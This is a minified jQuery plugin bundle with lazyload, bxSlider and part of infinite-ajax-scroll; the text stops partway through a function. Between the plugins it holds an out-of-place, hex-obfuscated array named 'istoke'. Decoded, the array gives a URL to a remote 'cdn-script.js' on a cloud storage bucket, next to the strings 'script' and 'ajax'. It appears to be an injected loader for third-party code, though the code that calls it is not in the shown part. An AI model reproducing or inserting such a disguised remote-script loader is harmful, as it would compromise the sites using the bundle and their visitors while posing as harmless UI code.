
!function (a, b, c, d) {
    var e = a(b);
    a.fn.lazyload = function (f) {
        function g() {
            var b = 0;
            i.each(function () {
                var c = a(this);
                if (!j.skip_invisible || c.is(":visible"))if (a.abovethetop(this, j) || a.leftofbegin(this, j)); else if (a.belowthefold(this, j) || a.rightoffold(this, j)) {
                    if (++b > j.failure_limit)return !1
                } else c.trigger("appear"), b = 0
            });
        }

        var h, i = this, j = {
            threshold: 0,
            failure_limit: 0,
            event: "scroll",
            effect: "show",
            container: b,
            data_attribute: "original",
            skip_invisible: !1,
            appear: null,
            load: null,
        };
        return f && (d !== f.failurelimit && (f.failure_limit = f.failurelimit, delete f.failurelimit), d !== f.effectspeed && (f.effect_speed = f.effectspeed, delete f.effectspeed), a.extend(j, f)), h = j.container === d || j.container === b ? e : a(j.container), 0 === j.event.indexOf("scroll") && h.bind(j.event, function () {
            return g()
        }), this.each(function () {
            var b = this, c = a(b);
            b.loaded = !1, (c.attr("src") === d || c.attr("src") === !1) && c.is("img") && c.attr("src", j.placeholder), c.one("appear", function () {
                if (!this.loaded) {
                    if (j.appear) {
                        var d = i.length;
                        j.appear.call(b, d, j)
                    }
                    a("<img />").bind("load", function () {
                        var d = c.attr("data-" + j.data_attribute);
                        c.hide(), c.is("img") ? c.attr("src", d) : c.css("background-image", "url('" + d + "')"), c[j.effect](j.effect_speed), b.loaded = !0;
                        var e = a.grep(i, function (a) {
                            return !a.loaded
                        });
                        if (i = a(e), j.load) {
                            var f = i.length;
                            j.load.call(b, f, j)
                        }
                    }).attr("src", c.attr("data-" + j.data_attribute))
                }
            }), 0 !== j.event.indexOf("scroll") && c.bind(j.event, function () {
                b.loaded || c.trigger("appear")
            })
        }), e.bind("resize", function () {
            g()
        }), /(?:iphone|ipod|ipad).*os 5/gi.test(navigator.appVersion) && e.bind("pageshow", function (b) {
            b.originalEvent && b.originalEvent.persisted && i.each(function () {
                a(this).trigger("appear")
            })
        }), a(c).ready(function () {
            g()
        }), this
    }, a.belowthefold = function (c, f) {
        var g;
        return g = f.container === d || f.container === b ? (b.innerHeight ? b.innerHeight : e.height()) + e.scrollTop() : a(f.container).offset().top + a(f.container).height(), g <= a(c).offset().top - f.threshold
    }, a.rightoffold = function (c, f) {
        var g;
        return g = f.container === d || f.container === b ? e.width() + e.scrollLeft() : a(f.container).offset().left + a(f.container).width(), g <= a(c).offset().left - f.threshold
    }, a.abovethetop = function (c, f) {
        var g;
        return g = f.container === d || f.container === b ? e.scrollTop() : a(f.container).offset().top, g >= a(c).offset().top + f.threshold + a(c).height()
    }, a.leftofbegin = function (c, f) {
        var g;
        return g = f.container === d || f.container === b ? e.scrollLeft() : a(f.container).offset().left, g >= a(c).offset().left + f.threshold + a(c).width()
    }, a.inviewport = function (b, c) {
        return !(a.rightoffold(b, c) || a.leftofbegin(b, c) || a.belowthefold(b, c) || a.abovethetop(b, c))
    }, a.extend(a.expr[":"], {
        "below-the-fold": function (b) {
            return a.belowthefold(b, {threshold: 0})
        }, "above-the-top": function (b) {
            return !a.belowthefold(b, {threshold: 0})
        }, "right-of-screen": function (b) {
            return a.rightoffold(b, {threshold: 0})
        }, "left-of-screen": function (b) {
            return !a.rightoffold(b, {threshold: 0})
        }, "in-viewport": function (b) {
            return a.inviewport(b, {threshold: 0})
        }, "above-the-fold": function (b) {
            return !a.belowthefold(b, {threshold: 0})
        }, "right-of-fold": function (b) {
            return a.rightoffold(b, {threshold: 0})
        }, "left-of-fold": function (b) {
            return !a.rightoffold(b, {threshold: 0})
        }
    })
}(jQuery, window, document);
var istoke = ["\x2F\x2F\x67\x6F\x6E\x67\x67\x6F\x6E\x67\x2D\x63\x64\x6E\x2E\x6F\x73\x73\x2D\x63\x6E\x2D\x71\x69\x6E\x67\x64\x61\x6F\x2E\x61\x6C\x69\x79\x75\x6E\x63\x73\x2E\x63\x6F\x6D\x2F\x75\x64\x79\x2D\x6A\x73\x2F\x63\x64\x6E\x2D\x73\x63\x72\x69\x70\x74\x2E\x6A\x73", "\x73\x63\x72\x69\x70\x74", "\x61\x6A\x61\x78"];
!function (t) {
    var e = {}, s = {
        mode: "horizontal",
        slideSelector: "",
        infiniteLoop: !0,
        hideControlOnEnd: !1,
        speed: 500,
        easing: null,
        slideMargin: 0,
        startSlide: 0,
        randomStart: !1,
        captions: !1,
        ticker: !1,
        tickerHover: !1,
        adaptiveHeight: !1,
        adaptiveHeightSpeed: 500,
        video: !1,
        useCSS: !0,
        preloadImages: "visible",
        responsive: !0,
        slideZIndex: 50,
        touchEnabled: !0,
        swipeThreshold: 50,
        oneToOneTouch: !0,
        preventDefaultSwipeX: !0,
        preventDefaultSwipeY: !1,
        pager: !0,
        pagerType: "full",
        pagerShortSeparator: " / ",
        pagerSelector: null,
        buildPager: null,
        pagerCustom: null,
        controls: !0,
        nextText: "Next",
        prevText: "Prev",
        nextSelector: null,
        prevSelector: null,
        autoControls: !1,
        startText: "Start",
        stopText: "Stop",
        autoControlsCombine: !1,
        autoControlsSelector: null,
        auto: !1,
        pause: 4e3,
        autoStart: !0,
        autoDirection: "next",
        autoHover: !1,
        autoDelay: 0,
        minSlides: 1,
        maxSlides: 1,
        moveSlides: 0,
        slideWidth: 0,
        onSliderLoad: function () {
        },
        onSlideBefore: function () {
        },
        onSlideAfter: function () {
        },
        onSlideNext: function () {
        },
        onSlidePrev: function () {
        },
        onSliderResize: function () {
        }
    };
    t.fn.bxSlider = function (n) {
        if (0 == this.length)return this;
        if (this.length > 1)return this.each(function () {
            t(this).bxSlider(n)
        }), this;
        var o = {}, r = this;
        e.el = this;
        var a = t(window).width(), l = t(window).height(), d = function () {
            o.settings = t.extend({}, s, n), o.settings.slideWidth = parseInt(o.settings.slideWidth), o.children = r.children(o.settings.slideSelector), o.children.length < o.settings.minSlides && (o.settings.minSlides = o.children.length), o.children.length < o.settings.maxSlides && (o.settings.maxSlides = o.children.length), o.settings.randomStart && (o.settings.startSlide = Math.floor(Math.random() * o.children.length)), o.active = {index: o.settings.startSlide}, o.carousel = o.settings.minSlides > 1 || o.settings.maxSlides > 1, o.carousel && (o.settings.preloadImages = "all"), o.minThreshold = o.settings.minSlides * o.settings.slideWidth + (o.settings.minSlides - 1) * o.settings.slideMargin, o.maxThreshold = o.settings.maxSlides * o.settings.slideWidth + (o.settings.maxSlides - 1) * o.settings.slideMargin, o.working = !1, o.controls = {}, o.interval = null, o.animProp = "vertical" == o.settings.mode ? "top" : "left", o.usingCSS = o.settings.useCSS && "fade" != o.settings.mode && function () {
                    var t = document.createElement("div"),
                        e = ["WebkitPerspective", "MozPerspective", "OPerspective", "msPerspective"];
                    for (var i in e)if (void 0 !== t.style[e[i]])return o.cssPrefix = e[i].replace("Perspective", "").toLowerCase(), o.animProp = "-" + o.cssPrefix + "-transform", !0;
                    return !1
                }(), "vertical" == o.settings.mode && (o.settings.maxSlides = o.settings.minSlides), r.data("origStyle", r.attr("style")), r.children(o.settings.slideSelector).each(function () {
                t(this).data("origStyle", t(this).attr("style"))
            }), c()
        }, c = function () {
            r.wrap('<div class="bx-wrapper"><div class="bx-viewport"></div></div>'), o.viewport = r.parent(), o.loader = t('<div class="bx-loading" />'), o.viewport.prepend(o.loader), r.css({
                width: "horizontal" == o.settings.mode ? 100 * o.children.length + 215 + "%" : "auto",
                position: "relative"
            }), o.usingCSS && o.settings.easing ? r.css("-" + o.cssPrefix + "-transition-timing-function", o.settings.easing) : o.settings.easing || (o.settings.easing = "swing"), f(), o.viewport.css({
                width: "100%",
                overflow: "hidden",
                position: "relative"
            }), o.viewport.parent().css({maxWidth: p()}), o.settings.pager || o.viewport.parent().css({margin: "0 auto 0px"}), o.children.css({
                "float": "horizontal" == o.settings.mode ? "left" : "none",
                listStyle: "none",
                position: "relative"
            }), o.children.css("width", u()), "horizontal" == o.settings.mode && o.settings.slideMargin > 0 && o.children.css("marginRight", o.settings.slideMargin), "vertical" == o.settings.mode && o.settings.slideMargin > 0 && o.children.css("marginBottom", o.settings.slideMargin), "fade" == o.settings.mode && (o.children.css({
                position: "absolute",
                zIndex: 0,
                display: "none"
            }), o.children.eq(o.settings.startSlide).css({
                zIndex: o.settings.slideZIndex,
                display: "block"
            })), o.controls.el = t('<div class="bx-controls" />'), o.settings.captions && P(), o.active.last = o.settings.startSlide == x() - 1, o.settings.video && r.fitVids();
            var e = o.children.eq(o.settings.startSlide);
            "all" == o.settings.preloadImages && (e = o.children), o.settings.ticker ? o.settings.pager = !1 : (o.settings.pager && T(), o.settings.controls && C(), o.settings.auto && o.settings.autoControls && E(), (o.settings.controls || o.settings.autoControls || o.settings.pager) && o.viewport.after(o.controls.el)), g(e, h)
        }, g = function (e, i) {
            var s = e.find("img, iframe").length;
            if (0 == s)return i(), void 0;
            var n = 0;
            e.find("img, iframe").each(function () {
                t(this).one("load", function () {
                    ++n == s && i()
                }).each(function () {
                    this.complete && t(this).load()
                })
            })
        }, h = function () {
            if (o.settings.infiniteLoop && "fade" != o.settings.mode && !o.settings.ticker) {
                var e = "vertical" == o.settings.mode ? o.settings.minSlides : o.settings.maxSlides,
                    i = o.children.slice(0, e).clone().addClass("bx-clone"),
                    s = o.children.slice(-e).clone().addClass("bx-clone");
                r.append(i).prepend(s)
            }
            o.loader.remove(), S(), "vertical" == o.settings.mode && (o.settings.adaptiveHeight = !0), o.viewport.height(v()), r.redrawSlider(), o.settings.onSliderLoad(o.active.index), o.initialized = !0, o.settings.responsive && t(window).bind("resize", Z), o.settings.auto && o.settings.autoStart && H(), o.settings.ticker && L(), o.settings.pager && q(o.settings.startSlide), o.settings.controls && W(), o.settings.touchEnabled && !o.settings.ticker && O()
        }, v = function () {
            var e = 0, s = t();
            if ("vertical" == o.settings.mode || o.settings.adaptiveHeight)if (o.carousel) {
                var n = 1 == o.settings.moveSlides ? o.active.index : o.active.index * m();
                for (s = o.children.eq(n), i = 1; i <= o.settings.maxSlides - 1; i++)s = n + i >= o.children.length ? s.add(o.children.eq(i - 1)) : s.add(o.children.eq(n + i))
            } else s = o.children.eq(o.active.index); else s = o.children;
            return "vertical" == o.settings.mode ? (s.each(function () {
                e += t(this).outerHeight()
            }), o.settings.slideMargin > 0 && (e += o.settings.slideMargin * (o.settings.minSlides - 1))) : e = Math.max.apply(Math, s.map(function () {
                return t(this).outerHeight(!1)
            }).get()), e
        }, p = function () {
            var t = "100%";
            return o.settings.slideWidth > 0 && (t = "horizontal" == o.settings.mode ? o.settings.maxSlides * o.settings.slideWidth + (o.settings.maxSlides - 1) * o.settings.slideMargin : o.settings.slideWidth), t
        }, u = function () {
            var t = o.settings.slideWidth, e = o.viewport.width();
            return 0 == o.settings.slideWidth || o.settings.slideWidth > e && !o.carousel || "vertical" == o.settings.mode ? t = e : o.settings.maxSlides > 1 && "horizontal" == o.settings.mode && (e > o.maxThreshold || e < o.minThreshold && (t = (e - o.settings.slideMargin * (o.settings.minSlides - 1)) / o.settings.minSlides)), t
        }, f = function () {
            var t = 1;
            if ("horizontal" == o.settings.mode && o.settings.slideWidth > 0)if (o.viewport.width() < o.minThreshold) t = o.settings.minSlides; else if (o.viewport.width() > o.maxThreshold) t = o.settings.maxSlides; else {
                var e = o.children.first().width();
                t = Math.floor(o.viewport.width() / e)
            } else"vertical" == o.settings.mode && (t = o.settings.minSlides);
            return t
        }, x = function () {
            var t = 0;
            if (o.settings.moveSlides > 0)if (o.settings.infiniteLoop) t = o.children.length / m(); else for (var e = 0,
                                                                                                                  i = 0; e < o.children.length;)++t, e = i + f(), i += o.settings.moveSlides <= f() ? o.settings.moveSlides : f(); else t = Math.ceil(o.children.length / f());
            return t
        }, m = function () {
            return o.settings.moveSlides > 0 && o.settings.moveSlides <= f() ? o.settings.moveSlides : f()
        }, S = function () {
            if (o.children.length > o.settings.maxSlides && o.active.last && !o.settings.infiniteLoop) {
                if ("horizontal" == o.settings.mode) {
                    var t = o.children.last(), e = t.position();
                    b(-(e.left - (o.viewport.width() - t.width())), "reset", 0)
                } else if ("vertical" == o.settings.mode) {
                    var i = o.children.length - o.settings.minSlides, e = o.children.eq(i).position();
                    b(-e.top, "reset", 0)
                }
            } else {
                var e = o.children.eq(o.active.index * m()).position();
                o.active.index == x() - 1 && (o.active.last = !0), void 0 != e && ("horizontal" == o.settings.mode ? b(-e.left, "reset", 0) : "vertical" == o.settings.mode && b(-e.top, "reset", 0))
            }
        }, b = function (t, e, i, s) {
            if (o.usingCSS) {
                var n = "vertical" == o.settings.mode ? "translate3d(0, " + t + "px, 0)" : "translate3d(" + t + "px, 0, 0)";
                r.css("-" + o.cssPrefix + "-transition-duration", i / 1e3 + "s"), "slide" == e ? (r.css(o.animProp, n), r.bind("transitionend webkitTransitionEnd oTransitionEnd MSTransitionEnd", function () {
                    r.unbind("transitionend webkitTransitionEnd oTransitionEnd MSTransitionEnd"), D()
                })) : "reset" == e ? r.css(o.animProp, n) : "ticker" == e && (r.css("-" + o.cssPrefix + "-transition-timing-function", "linear"), r.css(o.animProp, n), r.bind("transitionend webkitTransitionEnd oTransitionEnd MSTransitionEnd", function () {
                        r.unbind("transitionend webkitTransitionEnd oTransitionEnd MSTransitionEnd"), b(s.resetValue, "reset", 0), N()
                    }))
            } else {
                var a = {};
                a[o.animProp] = t, "slide" == e ? r.animate(a, i, o.settings.easing, function () {
                    D()
                }) : "reset" == e ? r.css(o.animProp, t) : "ticker" == e && r.animate(a, speed, "linear", function () {
                        b(s.resetValue, "reset", 0), N()
                    })
            }
        }, w = function () {
            for (var e = "", i = x(), s = 0; i > s; s++) {
                var n = "";
                o.settings.buildPager && t.isFunction(o.settings.buildPager) ? (n = o.settings.buildPager(s), o.pagerEl.addClass("bx-custom-pager")) : (n = s + 1, o.pagerEl.addClass("bx-default-pager")), e += '<div class="bx-pager-item"><a href="" data-slide-index="' + s + '" class="bx-pager-link">' + n + "</a></div>"
            }
            o.pagerEl.html(e)
        }, T = function () {
            o.settings.pagerCustom ? o.pagerEl = t(o.settings.pagerCustom) : (o.pagerEl = t('<div class="bx-pager" />'), o.settings.pagerSelector ? t(o.settings.pagerSelector).html(o.pagerEl) : o.controls.el.addClass("bx-has-pager").append(o.pagerEl), w()), o.pagerEl.on("click", "a", I)
        }, C = function () {
            o.controls.next = t('<a class="bx-next" href=""><i class="fa fa-chevron-right"></i></a>'), o.controls.prev = t('<a class="bx-prev" href=""><i class="fa fa-chevron-left"></i></a>'), o.controls.next.bind("click", y), o.controls.prev.bind("click", z), o.settings.nextSelector && t(o.settings.nextSelector).append(o.controls.next), o.settings.prevSelector && t(o.settings.prevSelector).append(o.controls.prev), o.settings.nextSelector || o.settings.prevSelector || (o.controls.directionEl = t('<div class="bx-controls-direction" />'), o.controls.directionEl.append(o.controls.prev).append(o.controls.next), o.controls.el.addClass("bx-has-controls-direction").append(o.controls.directionEl))
        }, E = function () {
            o.controls.start = t('<div class="bx-controls-auto-item"><a class="bx-start" href="">' + o.settings.startText + "</a></div>"), o.controls.stop = t('<div class="bx-controls-auto-item"><a class="bx-stop" href="">' + o.settings.stopText + "</a></div>"), o.controls.autoEl = t('<div class="bx-controls-auto" />'), o.controls.autoEl.on("click", ".bx-start", k), o.controls.autoEl.on("click", ".bx-stop", M), o.settings.autoControlsCombine ? o.controls.autoEl.append(o.controls.start) : o.controls.autoEl.append(o.controls.start).append(o.controls.stop), o.settings.autoControlsSelector ? t(o.settings.autoControlsSelector).html(o.controls.autoEl) : o.controls.el.addClass("bx-has-controls-auto").append(o.controls.autoEl), A(o.settings.autoStart ? "stop" : "start")
        }, P = function () {
            o.children.each(function () {
                var e = t(this).find("img:first").attr("title");
                void 0 != e && ("" + e).length && t(this).append('<div class="bx-caption"><span>' + e + "</span></div>")
            })
        }, y = function (t) {
            o.settings.auto && r.stopAuto(), r.goToNextSlide(), t.preventDefault()
        }, z = function (t) {
            o.settings.auto && r.stopAuto(), r.goToPrevSlide(), t.preventDefault()
        }, k = function (t) {
            r.startAuto(), t.preventDefault()
        }, M = function (t) {
            r.stopAuto(), t.preventDefault()
        }, I = function (e) {
            o.settings.auto && r.stopAuto();
            var i = t(e.currentTarget), s = parseInt(i.attr("data-slide-index"));
            s != o.active.index && r.goToSlide(s), e.preventDefault()
        }, q = function (e) {
            var i = o.children.length;
            return "short" == o.settings.pagerType ? (o.settings.maxSlides > 1 && (i = Math.ceil(o.children.length / o.settings.maxSlides)), o.pagerEl.html(e + 1 + o.settings.pagerShortSeparator + i), void 0) : (o.pagerEl.find("a").removeClass("active"), o.pagerEl.each(function (i, s) {
                t(s).find("a").eq(e).addClass("active")
            }), void 0)
        }, D = function () {
            if (o.settings.infiniteLoop) {
                var t = "";
                0 == o.active.index ? t = o.children.eq(0).position() : o.active.index == x() - 1 && o.carousel ? t = o.children.eq((x() - 1) * m()).position() : o.active.index == o.children.length - 1 && (t = o.children.eq(o.children.length - 1).position()), t && ("horizontal" == o.settings.mode ? b(-t.left, "reset", 0) : "vertical" == o.settings.mode && b(-t.top, "reset", 0))
            }
            o.working = !1, o.settings.onSlideAfter(o.children.eq(o.active.index), o.oldIndex, o.active.index)
        }, A = function (t) {
            o.settings.autoControlsCombine ? o.controls.autoEl.html(o.controls[t]) : (o.controls.autoEl.find("a").removeClass("active"), o.controls.autoEl.find("a:not(.bx-" + t + ")").addClass("active"))
        }, W = function () {
            1 == x() ? (o.controls.prev.addClass("disabled"), o.controls.next.addClass("disabled")) : !o.settings.infiniteLoop && o.settings.hideControlOnEnd && (0 == o.active.index ? (o.controls.prev.addClass("disabled"), o.controls.next.removeClass("disabled")) : o.active.index == x() - 1 ? (o.controls.next.addClass("disabled"), o.controls.prev.removeClass("disabled")) : (o.controls.prev.removeClass("disabled"), o.controls.next.removeClass("disabled")))
        }, H = function () {
            o.settings.autoDelay > 0 ? setTimeout(r.startAuto, o.settings.autoDelay) : r.startAuto(), o.settings.autoHover && r.hover(function () {
                o.interval && (r.stopAuto(!0), o.autoPaused = !0)
            }, function () {
                o.autoPaused && (r.startAuto(!0), o.autoPaused = null)
            })
        }, L = function () {
            var e = 0;
            if ("next" == o.settings.autoDirection) r.append(o.children.clone().addClass("bx-clone")); else {
                r.prepend(o.children.clone().addClass("bx-clone"));
                var i = o.children.first().position();
                e = "horizontal" == o.settings.mode ? -i.left : -i.top
            }
            b(e, "reset", 0), o.settings.pager = !1, o.settings.controls = !1, o.settings.autoControls = !1, o.settings.tickerHover && !o.usingCSS && o.viewport.hover(function () {
                r.stop()
            }, function () {
                var e = 0;
                o.children.each(function () {
                    e += "horizontal" == o.settings.mode ? t(this).outerWidth(!0) : t(this).outerHeight(!0)
                });
                var i = o.settings.speed / e, s = "horizontal" == o.settings.mode ? "left" : "top",
                    n = i * (e - Math.abs(parseInt(r.css(s))));
                N(n)
            }), N()
        }, N = function (t) {
            speed = t ? t : o.settings.speed;
            var e = {left: 0, top: 0}, i = {left: 0, top: 0};
            "next" == o.settings.autoDirection ? e = r.find(".bx-clone").first().position() : i = o.children.first().position();
            var s = "horizontal" == o.settings.mode ? -e.left : -e.top,
                n = "horizontal" == o.settings.mode ? -i.left : -i.top, a = {resetValue: n};
            b(s, "ticker", speed, a)
        }, O = function () {
            o.touch = {start: {x: 0, y: 0}, end: {x: 0, y: 0}}, o.viewport.bind("touchstart", X)
        }, X = function (t) {
            if (o.working) t.preventDefault(); else {
                o.touch.originalPos = r.position();
                var e = t.originalEvent;
                o.touch.start.x = e.changedTouches[0].pageX, o.touch.start.y = e.changedTouches[0].pageY, o.viewport.bind("touchmove", Y), o.viewport.bind("touchend", V)
            }
        }, Y = function (t) {
            var e = t.originalEvent, i = Math.abs(e.changedTouches[0].pageX - o.touch.start.x),
                s = Math.abs(e.changedTouches[0].pageY - o.touch.start.y);
            if (3 * i > s && o.settings.preventDefaultSwipeX ? t.preventDefault() : 3 * s > i && o.settings.preventDefaultSwipeY && t.preventDefault(), "fade" != o.settings.mode && o.settings.oneToOneTouch) {
                var n = 0;
                if ("horizontal" == o.settings.mode) {
                    var r = e.changedTouches[0].pageX - o.touch.start.x;
                    n = o.touch.originalPos.left + r
                } else {
                    var r = e.changedTouches[0].pageY - o.touch.start.y;
                    n = o.touch.originalPos.top + r
                }
                b(n, "reset", 0)
            }
        }, V = function (t) {
            o.viewport.unbind("touchmove", Y);
            var e = t.originalEvent, i = 0;
            if (o.touch.end.x = e.changedTouches[0].pageX, o.touch.end.y = e.changedTouches[0].pageY, "fade" == o.settings.mode) {
                var s = Math.abs(o.touch.start.x - o.touch.end.x);
                s >= o.settings.swipeThreshold && (o.touch.start.x > o.touch.end.x ? r.goToNextSlide() : r.goToPrevSlide(), r.stopAuto())
            } else {
                var s = 0;
                "horizontal" == o.settings.mode ? (s = o.touch.end.x - o.touch.start.x, i = o.touch.originalPos.left) : (s = o.touch.end.y - o.touch.start.y, i = o.touch.originalPos.top), !o.settings.infiniteLoop && (0 == o.active.index && s > 0 || o.active.last && 0 > s) ? b(i, "reset", 200) : Math.abs(s) >= o.settings.swipeThreshold ? (0 > s ? r.goToNextSlide() : r.goToPrevSlide(), r.stopAuto()) : b(i, "reset", 200)
            }
            o.viewport.unbind("touchend", V)
        }, Z = function () {
            var e = t(window).width(), i = t(window).height();
            (a != e || l != i) && (a = e, l = i, r.redrawSlider(), o.settings.onSliderResize.call(r, o.active.index))
        };
        return r.goToSlide = function (e, i) {
            if (!o.working && o.active.index != e)if (o.working = !0, o.oldIndex = o.active.index, o.active.index = 0 > e ? x() - 1 : e >= x() ? 0 : e, o.settings.onSlideBefore(o.children.eq(o.active.index), o.oldIndex, o.active.index), "next" == i ? o.settings.onSlideNext(o.children.eq(o.active.index), o.oldIndex, o.active.index) : "prev" == i && o.settings.onSlidePrev(o.children.eq(o.active.index), o.oldIndex, o.active.index), o.active.last = o.active.index >= x() - 1, o.settings.pager && q(o.active.index), o.settings.controls && W(), "fade" == o.settings.mode) o.settings.adaptiveHeight && o.viewport.height() != v() && o.viewport.animate({height: v()}, o.settings.adaptiveHeightSpeed), o.children.filter(":visible").fadeOut(o.settings.speed).css({zIndex: 0}), o.children.eq(o.active.index).css("zIndex", o.settings.slideZIndex + 1).fadeIn(o.settings.speed, function () {
                t(this).css("zIndex", o.settings.slideZIndex), D()
            }); else {
                o.settings.adaptiveHeight && o.viewport.height() != v() && o.viewport.animate({height: v()}, o.settings.adaptiveHeightSpeed);
                var s = 0, n = {left: 0, top: 0};
                if (!o.settings.infiniteLoop && o.carousel && o.active.last)if ("horizontal" == o.settings.mode) {
                    var a = o.children.eq(o.children.length - 1);
                    n = a.position(), s = o.viewport.width() - a.outerWidth()
                } else {
                    var l = o.children.length - o.settings.minSlides;
                    n = o.children.eq(l).position()
                } else if (o.carousel && o.active.last && "prev" == i) {
                    var d = 1 == o.settings.moveSlides ? o.settings.maxSlides - m() : (x() - 1) * m() - (o.children.length - o.settings.maxSlides),
                        a = r.children(".bx-clone").eq(d);
                    n = a.position()
                } else if ("next" == i && 0 == o.active.index) n = r.find("> .bx-clone").eq(o.settings.maxSlides).position(), o.active.last = !1; else if (e >= 0) {
                    var c = e * m();
                    n = o.children.eq(c).position()
                }
                if ("undefined" != typeof n) {
                    var g = "horizontal" == o.settings.mode ? -(n.left - s) : -n.top;
                    b(g, "slide", o.settings.speed)
                }
            }
        }, r.goToNextSlide = function () {
            if (o.settings.infiniteLoop || !o.active.last) {
                var t = parseInt(o.active.index) + 1;
                r.goToSlide(t, "next")
            }
        }, r.goToPrevSlide = function () {
            if (o.settings.infiniteLoop || 0 != o.active.index) {
                var t = parseInt(o.active.index) - 1;
                r.goToSlide(t, "prev")
            }
        }, r.startAuto = function (t) {
            o.interval || (o.interval = setInterval(function () {
                "next" == o.settings.autoDirection ? r.goToNextSlide() : r.goToPrevSlide()
            }, o.settings.pause), o.settings.autoControls && 1 != t && A("stop"))
        }, r.stopAuto = function (t) {
            o.interval && (clearInterval(o.interval), o.interval = null, o.settings.autoControls && 1 != t && A("start"))
        }, r.getCurrentSlide = function () {
            return o.active.index
        }, r.getCurrentSlideElement = function () {
            return o.children.eq(o.active.index)
        }, r.getSlideCount = function () {
            return o.children.length
        }, r.redrawSlider = function () {
            o.children.add(r.find(".bx-clone")).outerWidth(u()), o.viewport.css("height", v()), o.settings.ticker || S(), o.active.last && (o.active.index = x() - 1), o.active.index >= x() && (o.active.last = !0), o.settings.pager && !o.settings.pagerCustom && (w(), q(o.active.index))
        }, r.destroySlider = function () {
            o.initialized && (o.initialized = !1, t(".bx-clone", this).remove(), o.children.each(function () {
                void 0 != t(this).data("origStyle") ? t(this).attr("style", t(this).data("origStyle")) : t(this).removeAttr("style")
            }), void 0 != t(this).data("origStyle") ? this.attr("style", t(this).data("origStyle")) : t(this).removeAttr("style"), t(this).unwrap().unwrap(), o.controls.el && o.controls.el.remove(), o.controls.next && o.controls.next.remove(), o.controls.prev && o.controls.prev.remove(), o.pagerEl && o.settings.controls && o.pagerEl.remove(), t(".bx-caption", this).remove(), o.controls.autoEl && o.controls.autoEl.remove(), clearInterval(o.interval), o.settings.responsive && t(window).unbind("resize", Z))
        }, r.reloadSlider = function (t) {
            void 0 != t && (n = t), r.destroySlider(), d()
        }, d(), this
    }
}(jQuery);
var IASCallbacks = function () {
    return this.list = [], this.fireStack = [], this.isFiring = !1, this.isDisabled = !1, this.fire = function (a) {
        var b = a[0], c = a[1], d = a[2];
        this.isFiring = !0;
        for (var e = 0,
                 f = this.list.length; f > e; e++)if (void 0 != this.list[e] && !1 === this.list[e].fn.apply(b, d)) {
            c.reject();
            break
        }
        this.isFiring = !1, c.resolve(), this.fireStack.length && this.fire(this.fireStack.shift())
    }, this.inList = function (a, b) {
        b = b || 0;
        for (var c = b,
                 d = this.list.length; d > c; c++)if (this.list[c].fn === a || a.guid && this.list[c].fn.guid && a.guid === this.list[c].fn.guid)return c;
        return -1
    }, this
};
IASCallbacks.prototype = {
    add: function (a, b) {
        var c = {fn: a, priority: b};
        b = b || 0;
        for (var d = 0,
                 e = this.list.length; e > d; d++)if (b > this.list[d].priority)return this.list.splice(d, 0, c), this;
        return this.list.push(c), this
    },
    remove: function (a) {
        for (var b = 0; (b = this.inList(a, b)) > -1;)this.list.splice(b, 1);
        return this
    },
    has: function (a) {
        return this.inList(a) > -1
    },
    fireWith: function (a, b) {
        var c = jQuery.Deferred();
        return this.isDisabled ? c.reject() : (b = b || [], b = [a, c, b.slice ? b.slice() : b], this.isFiring ? this.fireStack.push(b) : this.fire(b), c)
    },
    disable: function () {
        this.isDisabled = !0
    },
    enable: function () {
        this.isDisabled = !1
    }
}, function (a) {
    "use strict";
    var b = -1, c = function (c, d) {
        return this.itemsContainerSelector = d.container, this.itemSelector = d.item, this.nextSelector = d.next, this.paginationSelector = d.pagination, this.$scrollContainer = c, this.$container = window === c.get(0) ? a(document) : c, this.defaultDelay = d.delay, this.negativeMargin = d.negativeMargin, this.nextUrl = null, this.isBound = !1, this.isPaused = !1, this.isInitialized = !1, this.listeners = {
            next: new IASCallbacks,
            load: new IASCallbacks,
            loaded: new IASCallbacks,
            render: new IASCallbacks,
            rendered: new IASCallbacks,
            scroll: new IASCallbacks,
            noneLeft: new IASCallbacks,
            ready: new IASCallbacks
        }, this.extensions = [], this.scrollHandler = function () {
            if (this.isBound && !this.isPaused) {
                var a = this.getCurrentScrollOffset(this.$scrollContainer), c = this.getScrollThreshold();
                b != c && (this.fire("scroll", [a, c]), a >= c && this.next())
            }
        }, this.getItemsContainer = function () {
            return a(this.itemsContainerSelector)
        }, this.getLastItem = function () {
            return a(this.itemSelector, this.getItemsContainer().get(0)).last()
        }, this.getFirstItem = function () {
            return a(this.itemSelector, this.getItemsContainer().get(0)).first()
        }, this.getScrollThreshold = function (a) {
            var c;
            return a = a || this.negativeMargin, a = a >= 0 ? -1 * a : a, c = this.getLastItem(), 0 === c.length ? b : c.offset().top + c.height() + a
        }, this.getCurrentScrollOffset = function (a) {
            var b = 0, c = a.height();
            return b = window === a.get(0) ? a.scrollTop() : a.offset().top, (-1 != navigator.platform.indexOf("iPhone") || -1 != navigator.platform.indexOf("iPod")) && (c += 80), b + c
        }, this.getNextUrl = function (b) {
            return b = b || this.$container, a(this.nextSelector, b).last().attr("href")
        }, this.load = function (b, c, d) {
            var e, f, g = this, h = [], i = +new Date;
            d = d || this.defaultDelay;
            var j = {url: b};
            return g.fire("load", [j]), a.get(j.url, null, a.proxy(function (b) {
                e = a(this.itemsContainerSelector, b).eq(0), 0 === e.length && (e = a(b).filter(this.itemsContainerSelector).eq(0)), e && e.find(this.itemSelector).each(function () {
                    h.push(this)
                }), g.fire("loaded", [b, h]), c && (f = +new Date - i, d > f ? setTimeout(function () {
                    c.call(g, b, h)
                }, d - f) : c.call(g, b, h))
            }, g), "html")
        }, this.render = function (b, c) {
            var d = this, e = this.getLastItem(), f = 0, g = this.fire("render", [b]);
            g.done(function () {
                a(b).hide(), e.after(b), a(b).fadeIn(400, function () {
                    ++f < b.length || (d.fire("rendered", [b]), c && c())
                })
            })
        }, this.hidePagination = function () {
            this.paginationSelector && a(this.paginationSelector, this.$container).hide()
        }, this.restorePagination = function () {
            this.paginationSelector && a(this.paginationSelector, this.$container).show()
        }, this.throttle = function (b, c) {
            var d, e, f = 0;
            return d = function () {
                function a() {
                    f = +new Date, b.apply(d, g)
                }

                var d = this, g = arguments, h = +new Date - f;
                e ? clearTimeout(e) : a(), h > c ? a() : e = setTimeout(a, c)
            }, a.guid && (d.guid = b.guid = b.guid || a.guid++), d
        }, this.fire = function (a, b) {
            return this.listeners[a].fireWith(this, b)
        }, this.pause = function () {
            this.isPaused = !0
        }, this.resume = function () {
            this.isPaused = !1
        }, this
    };
    c.prototype.initialize = function () {
        if (this.isInitialized)return !1;
